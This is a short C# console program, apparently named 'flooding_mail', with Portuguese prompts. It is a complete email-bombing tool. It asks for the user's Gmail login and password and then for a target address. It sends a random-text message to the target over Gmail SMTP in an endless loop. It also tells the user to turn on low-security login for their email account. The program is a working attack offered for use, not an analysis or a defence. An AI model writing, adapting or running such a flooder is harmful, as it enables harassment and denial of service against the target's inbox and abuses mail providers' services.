using System;
using System.Net.Mail;
using System.Net;
using System.Threading;
using System.Text;

namespace flooding_mail
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.SetWindowSize(40,10);
            Console.ForegroundColor = ConsoleColor.Cyan;
            banner();
        }
        public static void banner()
        {
            string baner = @"
       ___     
  ____/ (_)___ 
 / __  / / __ \
/ /_/ / / /_/ /
\__,_/_/\____/ 
";
            Console.WriteLine(baner);
            Thread.Sleep(2000);
            Console.Clear();
            
            Console.WriteLine("Ative o login de baixa segurança no seu\nemail.");
            Thread.Sleep(1500);
            Console.Clear();
            Console.WriteLine("Login");
            Console.Write(">> ");
            
            string login = Console.ReadLine();
            Console.Clear();
            
            Console.WriteLine("Senha");
            Console.Write(">> ");
            
            var pass = string.Empty;
            ConsoleKey key;
            do
            {
                var keyInfo = Console.ReadKey(intercept: true);
                key = keyInfo.Key;

                if (key == ConsoleKey.Backspace && pass.Length > 0)
                {
                    Console.Write("\b \b");
                }
                else if (!char.IsControl(keyInfo.KeyChar))
                {
                    Console.Write("*");
                    pass += keyInfo.KeyChar;
                }
            } while (key != ConsoleKey.Enter);
            Console.Clear(); 
            Console.WriteLine("email do alvo");
            
            Console.Write(">> ");
            string email_alvo = Console.ReadLine();
            var fromAddress = new MailAddress(login);
            var toAddress = new MailAddress(email_alvo);
            
            string fromPassword = pass;
            const string subject = "Subject";
            string body = random(256);

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            using (var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body
            })
            {
                while (true) 
                {
                    smtp.Send(message); 
                }
                    
            }
        }
        static string random(int lenght)
        {
            {
                const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
                StringBuilder res = new StringBuilder();
                Random rnd = new Random();
                while (0 < lenght--)
                {
                    res.Append(valid[rnd.Next(valid.Length)]);
                }
                return res.ToString();
            }
        }
    }
}
